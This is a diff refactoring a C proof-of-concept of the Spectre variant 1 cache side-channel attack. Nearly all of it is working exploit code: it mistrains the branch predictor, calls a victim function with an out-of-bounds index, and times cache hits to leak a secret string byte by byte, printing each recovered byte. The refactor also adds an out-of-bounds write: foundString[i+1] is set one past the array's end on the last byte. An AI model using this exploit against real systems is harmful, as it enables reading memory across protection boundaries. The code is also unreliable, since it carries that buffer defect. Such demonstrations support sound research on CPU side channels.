@@ -17,7 +17,8 @@
 #include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
 #include <sched.h>
 #include <string.h>
-#include "helper.h"
+#include "memory_function.h"
+#include "helper_functions.h"
 
 /********************************************************************
 Victim code.
@@ -60,112 +61,82 @@ void victim_function(size_t x) {
 Analysis code
 ********************************************************************/
 
+static inline void callVictimCodeWithFlushedCache(size_t address) {
+    flush(&array1_size);
+    wait();
+    victim_function(address);
+}
+
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int valueScore[2]) {
+void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int valueScore[2], int num_tries) {
     static int results[256];
-    int tries, i, j, mix_i;
-    unsigned int junk = 0;
-    size_t training_x, x;
-    register uint64_t time1, time2;
-    volatile uint8_t *addr;
+    static int time;
+    static int i;
 
-    for (i = 0; i < 256; i++)
-        results[i] = 0;
+    for (i = 0; i < 256; i++) results[i] = 0;
 
-    for (tries = 999; tries > 0; tries--) {
+    while (num_tries-- > 0) {
         /* Flush array2[256*(0..255)] from cache */
-        for (i = 0; i < 256; i++)
-            _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
+        for (i = 0; i < 256; i++) flush(&array2[i * 512]);
+        wait();
 
-        training_x = tries % array1_size;
-        for (j = 29; j >= 0; j--) {
-            _mm_clflush(&array1_size);
-            /* Delay (can also mfence) */
-            wait();
+        /* Training the Branch Prediction of the victim code */
+        for (i = 10; i >= 0; i--)
+            callVictimCodeWithFlushedCache(num_tries % array1_size);
+        wait();
 
-            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
-            /* Avoid jumps in case those tip off the branch predictor */
-            x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-            x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
-            x = training_x ^ (x & (malicious_x ^ training_x));
-
-            /* Call the victim! */
-            victim_function(x);
-//            printf("%p", x);
-//            printf("\n");
-        }
+        /* Calling victim code so it loads data to cache */
+        callVictimCodeWithFlushedCache(malicious_x);
 
         /* Time reads. Order is lightly mixed up to prevent stride prediction */
         for (i = 0; i < 256; i++) {
-            mix_i = ((i * 167) + 13) & 255;
-            addr = &array2[mix_i * 512];
-
-            /*
-            We need to accurately measure the memory access to the current index of the
-            array, so we can determine which index was cached by the malicious misdirected code.
-
-            The best way to do this is to use the rdtscp instruction, which measures current
-            processor ticks, and is also serialized.
-            */
-
-            time1 = __rdtscp(&junk); /* READ TIMER */
-            junk = *addr; /* MEMORY ACCESS TO TIME */
-            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-            if ((int) time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
-                results[mix_i]++; /* cache hit - add +1 to score for this value */
+            int mix_i = ((i * 167) + 13) & 255;
+            time = (int) memaccesstime(&array2[mix_i * 512]);
+            if (time <= cache_hit_threshold && mix_i != array1[num_tries % array1_size])
+                results[mix_i]++;
         }
     }
 
-    j = 0;
+    int min_index = 0;
     for (i = 0; i < 256; i++) {
-        if (results[i] >= results[j]) {
-            j = i;
+        if (results[i] >= results[min_index]) {
+            min_index = i;
         }
     }
-    valueScore[0] = (uint8_t) j;
-    valueScore[1] = results[j];
+    valueScore[0] = min_index;
+    valueScore[1] = results[min_index];
 }
 
 int main() {
-    /* Default to a cache hit threshold of 80 */
-    int cache_hit_threshold = 80;
+    int num_tries = 1000;
+    int cacheHitThreshold = getCacheHitThresholdTime(10000);
 
-    /* Default for malicious_x is the secret string address */
     size_t malicious_x = (size_t) (secret - (char *) array1);
-
-    /* Default addresses to read is 40 (which is the length of the secret string) */
     char foundString[strlen(secret)];
     int valueScore[2];
-    int i;
 
-    for (i = 0; i < (int) sizeof(array2); i++) {
-        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
-    }
-
+    /* write to array2 so in RAM not copy-on-write zero pages */
+    for (int i = 0; i < (int) sizeof(array2); i++) array2[i] = 1;
 
     /* Print cache hit threshold */
-    printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);
+    printf("Using a cache hit threshold of %d.\n", cacheHitThreshold);
     printf("Reading %d bytes:\n", (int) sizeof(foundString));
 
     /* Start the read loop to read each address */
-    for (i = 0; i < (int) sizeof(foundString); i++) {
-        printf("Reading at malicious_x = %p... ", (void *) malicious_x);
-
-        /* Call readMemoryByte with the required cache hit threshold and
-           malicious x address. value and score are arrays that are
-           populated with the results.
-        */
-        readMemoryByte(cache_hit_threshold, malicious_x, valueScore);
-        malicious_x++;
-
-        foundString[i] = (char) (valueScore[0] > 31 && valueScore[0] < 127 ? valueScore[0] : '?');
+    for (int i = 0; i < (int) sizeof(foundString); i++) {
+        readMemoryByte(cacheHitThreshold, malicious_x, valueScore, num_tries);
+        foundString[i] = (char) valueScore[0];
+        foundString[i + 1] = '\0';
 
         /* Display the results */
-        printf("0x%02X=’%c’ score=%d ", valueScore[0], foundString[i], valueScore[1]);
+        printf("Speculatively accessed virtual address %p ", (void *) malicious_x);
+        printf("Got secret: %03d = '%c' ", foundString[i], foundString[i]);
+        printf("Success Rate: %04d/%d", valueScore[1], num_tries);
         printf("\n");
+
+        malicious_x++;
     }
-    foundString[i] = '\0';
     printf("Secret: %s\n", secret);
     printf("Found : %s", foundString);
-    return (0);
+    return 0;
 }
